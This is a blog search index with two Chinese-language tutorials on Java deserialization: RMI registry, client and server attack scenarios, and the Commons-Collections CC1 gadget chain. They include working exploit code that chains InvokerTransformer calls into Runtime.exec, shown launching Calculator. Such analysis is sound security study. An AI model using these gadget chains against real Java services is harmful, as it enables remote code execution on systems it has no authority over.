<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>RMI反序列化分析</title>
    <url>/2021/10/26/RMI%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20dd644916349848a0b8c4ef825b656560/</url>
    <content><![CDATA[<blockquote>
<p>本文分析了RMI的通信过程以及一些反序列化攻击的场景</p>
</blockquote>
<h2 id="1、RMI是什么"><a href="#1、RMI是什么" class="headerlink" title="1、RMI是什么"></a>1、RMI是什么</h2><p>RMI(Remote Method Invocatio)，是一种跨JVM实现方法调用的技术。一般由三个部分组成</p>
<ul>
<li>Client(客户端) Registry取得服务端注册的服务，然后调用远程方法  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Connect to RMI Registry :localhost:1099</span></span><br><span class="line">Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// search service which called evil and cast type to EvilService</span></span><br><span class="line">EvilService evilService = (EvilService) registry.lookup(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//call evil method and need to call &quot;put&quot; function to trigger</span></span><br><span class="line"><span class="comment">//evilTransformerMap方法具体的执行逻辑是在服务端执行的，并返回结果给client</span></span><br><span class="line">Map evilObject = (Map)evilService.evilTransformerMap();</span><br></pre></td></tr></table></figure>
</li>
<li>Registry(注册中心) 可以理解成一个存储远程对象的字典，负责网络传输的模块</li>
</ul>
<span id="more"></span>

<ul>
<li>Server(服务端) 负责在注册中心注册服务，其实就是将一个远程对象给Registry进行封装  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//实例化一个EvilService 即要绑定的对象</span></span><br><span class="line">EvilService evilService = <span class="keyword">new</span> EvilServiceImpl();</span><br><span class="line"><span class="comment">// 将此服务转换为远程服务接口</span></span><br><span class="line">EvilService skeleton = (EvilService) UnicastRemoteObject.exportObject(evilService,<span class="number">0</span>);</span><br><span class="line"><span class="comment">//创建注册中心</span></span><br><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"><span class="comment">//将服务注册</span></span><br><span class="line">registry.bind(<span class="string">&quot;evil&quot;</span>,skeleton);</span><br></pre></td></tr></table></figure></li>
</ul>
<p>PS:在低版本的JDK中，<code>Server</code>与<code>Registry</code>是可以不在一台服务器上的，而在高版本的JDK中，<code>Server</code>与<code>Registry</code>只能在一台服务器上，否则无法注册成功。</p>
<h2 id="2、服务端或服务端与注册中心通信"><a href="#2、服务端或服务端与注册中心通信" class="headerlink" title="2、服务端或服务端与注册中心通信"></a>2、服务端或服务端与注册中心通信</h2><h3 id="2-1-本地获取注册中心"><a href="#2-1-本地获取注册中心" class="headerlink" title="2.1 本地获取注册中心"></a>2.1 本地获取注册中心</h3><p>本地获取是在创建的同时返回<code>Registry</code>对象(<code>RegistryImpl</code>)通过<code>createRegistry</code> 方法如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br></pre></td></tr></table></figure>

<p>获取对象后可以进行<code>bind,list,lookup,rebind,unbind</code>等操作</p>
<h3 id="2-2-远程获取注册中心"><a href="#2-2-远程获取注册中心" class="headerlink" title="2.2 远程获取注册中心"></a>2.2 远程获取注册中心</h3><p>通过<code>getRegistry</code>方法获得的对象是<code>RegistryImpl_Stub</code>对象而<code>createRegistry</code>获得的是<code>RegistryImpl</code>对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br></pre></td></tr></table></figure>

<p>这两者的区别在于在对<code>Registry</code>进行操作的时候流程会有不同，有兴趣的同学可以尝试打断点进行调试查看具体区别</p>
<h3 id="2-3-客户端与服务端的通信"><a href="#2-3-客户端与服务端的通信" class="headerlink" title="2.3 客户端与服务端的通信"></a>2.3 客户端与服务端的通信</h3><p>这里主要讲一下会引发反序列化的环节</p>
<p>当客户端发起调用远程方法的时候，实际上是客户端与2.4中的<code>Skeleton</code>进行通信，而如果返回客户端的执行结果是一个对象，则在客户端会对其进行反序列化</p>
<p>而当服务端接收的某个参数类型是Object的时候，则会出现在服务端反序列化的情况。</p>
<h3 id="2-4-流程图"><a href="#2-4-流程图" class="headerlink" title="2.4 流程图"></a>2.4 流程图</h3><p><img src="/2021/10/26/RMI%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20dd644916349848a0b8c4ef825b656560/Untitled.png" alt="Untitled"></p>
<h2 id="3、反序列化攻击"><a href="#3、反序列化攻击" class="headerlink" title="3、反序列化攻击"></a>3、反序列化攻击</h2><h3 id="3-1-攻击Registry"><a href="#3-1-攻击Registry" class="headerlink" title="3.1 攻击Registry"></a>3.1 攻击Registry</h3><p>注册中心直接利用<code>bind</code>或<code>rebind</code>即可攻击这里不再赘述了</p>
<h3 id="3-2-攻击Client"><a href="#3-2-攻击Client" class="headerlink" title="3.2 攻击Client"></a>3.2 攻击Client</h3><p><strong>EvilObject</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilServiceImpl</span> <span class="keyword">implements</span> <span class="title">EvilService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilServiceImpl</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Transformer <span class="title">gadgetTransformerChain</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            transformerChain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                            String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;</span><br><span class="line">                            <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                            Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;</span><br><span class="line">                            <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open  /System/Applications/Calculator.app&quot;</span>&#125;)&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> transformerChain;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">evilTransformerMap</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="comment">//转化为map</span></span><br><span class="line">        Map outputMap = TransformedMap.decorate(<span class="keyword">new</span> HashMap&lt;&gt;(),<span class="keyword">null</span>,gadgetTransformerChain());</span><br><span class="line">        <span class="keyword">return</span> outputMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Server</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//实例化一个EvilService</span></span><br><span class="line">            EvilService evilService = <span class="keyword">new</span> EvilServiceImpl();</span><br><span class="line">            <span class="comment">// 将此服务转换为远程服务接口</span></span><br><span class="line">            EvilService skeleton = (EvilService) UnicastRemoteObject.exportObject(evilService,<span class="number">0</span>);</span><br><span class="line">            Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            registry.bind(<span class="string">&quot;evil&quot;</span>,skeleton);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Client</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// Connect to RMI Registry :localhost:1099</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// search service which called evil and cast type to EvilService</span></span><br><span class="line">        EvilService evilService = (EvilService) registry.lookup(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//call evil method and need to call &quot;put&quot; function to trigger</span></span><br><span class="line">        <span class="comment">//deserialize will happen when function evilTransformerMap() is called</span></span><br><span class="line">        Map evilObject = (Map)evilService.evilTransformerMap();</span><br><span class="line"></span><br><span class="line">        evilObject.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-3-攻击Server"><a href="#3-3-攻击Server" class="headerlink" title="3.3 攻击Server"></a>3.3 攻击Server</h3><p>大体上没什么变化只是<code>evilObject</code>的发送方产生了变化</p>
<p><strong>RMIClient</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                        Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open  /System/Applications/Calculator.app&quot;</span>&#125;)&#125;);</span><br><span class="line">        Map outputMap = TransformedMap.decorate(<span class="keyword">new</span> HashMap&lt;&gt;(),<span class="keyword">null</span>,transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Connect to RMI Registry :localhost:1099</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        Service service = (Service) registry.lookup(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">        <span class="comment">//触发服务端反序列化</span></span><br><span class="line">        service.evil(outputMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>ServiceImpl</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServiceImpl</span> <span class="keyword">implements</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ServiceImpl</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">evil</span><span class="params">(Object evilObject)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        ((Map) evilObject).put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4、修复"><a href="#4、修复" class="headerlink" title="4、修复"></a>4、修复</h2><p>1、在高版本的<code>jdk(8u141)</code>中,<code>RegistryImpl#bind</code>中添加了一个<code>checkAccess</code>方法，来检验你的来源是否为<code>localhost</code> ,这个修复解决了攻击注册中心的问题</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><hr>
<p><a href="https://paper.seebug.org/1251/#_9">Java 安全-RMI-学习总结</a></p>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>通过Apache Common-collections分析Java反序列化</title>
    <url>/2021/10/25/%E9%80%9A%E8%BF%87Apache%20Common-collections%E5%88%86%E6%9E%90Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20a077483736be4fc9b4c0a7638e574c4b/</url>
    <content><![CDATA[<hr>
<p>PS : cc1(CC3.1+AnnotationInvocationHandler)</p>
<h2 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、<strong>前言</strong></h2><p>本文将通过 Apache Commons-collections爆出的反序列化漏洞来作为例子进行原理分析。</p>
<h2 id="2、漏洞成因"><a href="#2、漏洞成因" class="headerlink" title="2、漏洞成因"></a>2、<strong>漏洞成因</strong></h2><p>在这个Java反序列化漏洞的利用链主要由三个部分组成</p>
<p>1、可以执行恶意代码的对象（在这个例子中即为<code>Commons-collection</code>中的<code>Transformer</code>类）</p>
<p>2、一个被恶意对象“寄生的宿主”，通俗的来说就是，宿主对象反序列化的时候因为需要执行<code>readObject</code>方法，而<code>readObject</code>方法在可以被序列化的类中需要被重写，重写后的方法可能存在某些能够触发恶意对象执行的操作。</p>
<p>3、需要一个能够将恶意对象进行包装的类。在有的情况下恶意对象没有办法直接‘寄生“在宿主上，这时候就需要一个类能够将恶意对象进行包装</p>
<p>在这个例子中恶意代码对象为<code>Commons-collection</code>中的<code>Transformer</code>类，这个类原本的设计是用来对类进行转换，而通过精心设计（后文会详细讲解）后能够通过这个类的<code>transform</code>方法实现命令执行。而被寄生的宿主为<code>AnnotationInvocationHandlerMap</code>类，通过其<code>readObject</code>方法能够触发漏洞。</p>
<p>而<code>AnnotationInvocationHandlerMap</code>类中有一个<code>Map</code>类型的成员变量<code>memberValues</code>，<code>Transformer</code>类可以通过用<code>Map</code>类包装寄生在<code>AnnotationInvocationHandlerMap</code>类</p>
<p>接下来会分为两个部分解释，即1如何通过<code>transfomer</code>进行命令执行，2是如何利用反序列化完成一个调用链</p>
<h2 id="3、Transformer类的作用"><a href="#3、Transformer类的作用" class="headerlink" title="3、Transformer类的作用"></a>3、<strong>Transformer类的作用</strong></h2><p>首先我们先看一下导致这个问题的核心类<code>Transformer</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是一个接口类，需要实现一个<code>transform</code>方法，而<code>transform</code>方法的目的是将<code>input object</code>转换为一个<code>output object</code> 从而完成类型的转换。</p>
<p>在整个调用过程中用到了三个实现<code>Transformer</code>的实现类<code>ConstantTransformer </code> <code>InvokerTransformer </code></p>
<p> <code>ChainedTransformer.</code></p>
<h3 id="3-1-ConstantTransformer"><a href="#3-1-ConstantTransformer" class="headerlink" title="3.1 ConstantTransformer"></a><strong>3.1 ConstantTransformer</strong></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//以下省去了部分代码</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Serial version UID */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">6374440726369055124L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The closures to call in turn */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可通过查看<code>ConstantTransformer</code>的源码发现，其<code>transform</code>方法无论输入什么类型都会返回一种初始化时定好的类型。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(<span class="keyword">new</span> ConstantTransformer(Runtime.class).transform(String.class));</span><br><span class="line"><span class="comment">//输出：class java.lang.Runtime</span></span><br><span class="line"><span class="comment">//无论transform的参数是什么都会得到相同的结果</span></span><br></pre></td></tr></table></figure>

<h3 id="3-2-InvokerTransformer"><a href="#3-2-InvokerTransformer" class="headerlink" title="3.2 InvokerTransformer"></a>3.2 <strong>InvokerTransformer</strong></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//以下省去了部分代码</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The serial version */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">8653385846894047688L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The method name to call */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="comment">/** The array of reflection parameter types */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="comment">/** The array of reflection arguments */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">          ***</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> method.invoke(input, iArgs);</span><br></pre></td></tr></table></figure>

<p><code>InvokerTransformer</code>的<code>transform</code>方法则是将传入的类的某种方法（方法名和参数同样在初始化的时候设定好了）利用<code>invoke</code>进行调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.out.println(new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;).transform(Runtime.class));</span><br><span class="line">//output：public static java.lang.Runtime java.lang.Runtime.getRuntime()</span><br></pre></td></tr></table></figure>

<p>当输入的参数为<code>Runtime.class</code>时相当于会调用<code>Runtime.class</code>的<code>getMethod</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Method <span class="title">getMethod</span><span class="params">(String name, Class&lt;?&gt;... parameterTypes)</span></span></span><br></pre></td></tr></table></figure>

<p>可以看到这个方法所需要的参数为name和参数类型，所以我们如果需要获取<code>Runtime</code>的<code>getRuntime</code>方法则需要传入的参数为 <code>“getRuntime”</code> 即方法名以及其对应的参数类型<code>Class&lt;?&gt;</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Runtime <span class="title">getRuntime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> currentRuntime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而<code>getRuntime</code>是个无参函数，所以传入一个空的Class数组即可。即<code>Class[0]</code>。</p>
<h3 id="3-3-ChainedTransformer"><a href="#3-3-ChainedTransformer" class="headerlink" title="3.3 ChainedTransformer"></a>3.3 <strong>ChainedTransformer</strong></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//省略部分代码</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Serial version UID */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">3514945074733160196L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The transformers to call in turn */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ChainedTransformer</code>的<code>transform</code>方法的作用是调用多个<code>transfomer</code>的<code>transform</code>依次对<code>object</code>进行操作也就是可以将多个<code>transformer</code>串联起来</p>
<h3 id="3-4-命令执行"><a href="#3-4-命令执行" class="headerlink" title="3.4 命令执行"></a>3.4 <strong>命令执行</strong></h3><p>假设我们需要执行一段这样的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>那我们可以构造如下的调用链来实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">Transformer transformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">transformer.transform(<span class="keyword">new</span> Object());</span><br></pre></td></tr></table></figure>

<p>即以上四个<code>Transformer</code>构成了一个<code>ChainedTransformer</code>，最终通过调用<code>ChainedTransformer</code>的<code>transform</code>方法来实现命令执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过ConstantTransformer先将传入的obejct修改为Runtime.class</span></span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(Runtime.class)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>之前提到过<code>InvokerTransformer</code>的<code>transformer</code>方法的作用是利用反射调用输入对象的某个方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//将Runtime.class作为输入可以得到getRuntime的Method对象</span></span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用Method对象的invoke方法,参数为new Object[]&#123;null,new Object[0]&#125;</span></span><br><span class="line"><span class="comment">//相当于执行method(getRuntime).invoke(null,new Object[0])</span></span><br><span class="line"><span class="comment">//由于getRuntime为静态方法，所以不需要传入实例，所以invoke方法的第一个参数可以为null,之前提到过getRuntime为无参方法所以参数只需要传入new Object[0]即一个空数组，至于这里为什么不也传入一个null是因为当invoke做遍历args时不会报错</span></span><br><span class="line"><span class="comment">//所以这个InvokerTransformer达到了传入一个Method对象转化为一个Runtime对象的目的</span></span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line"></span><br><span class="line"><span class="comment">//拿到Runtime对象后再通过一次反射进行命令执行即可</span></span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="3-5-TransformedMap"><a href="#3-5-TransformedMap" class="headerlink" title="3.5 TransformedMap"></a>3.5 <strong>TransformedMap</strong></h3><p>以上的调用方式最终需要<code>ChainedTransformer</code>调用<code>transform</code>方法，那现在问题就变成了如何去触发这个方法，通过find usage看看有哪些类用到了<code>Transformer</code>，可以看到有一个<code>TransformedMap</code>使用了，对源码进行查看</p>
<p><img src="/2021/10/25/%E9%80%9A%E8%BF%87Apache%20Common-collections%E5%88%86%E6%9E%90Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20a077483736be4fc9b4c0a7638e574c4b/Untitled.png" alt="Untitled"></p>
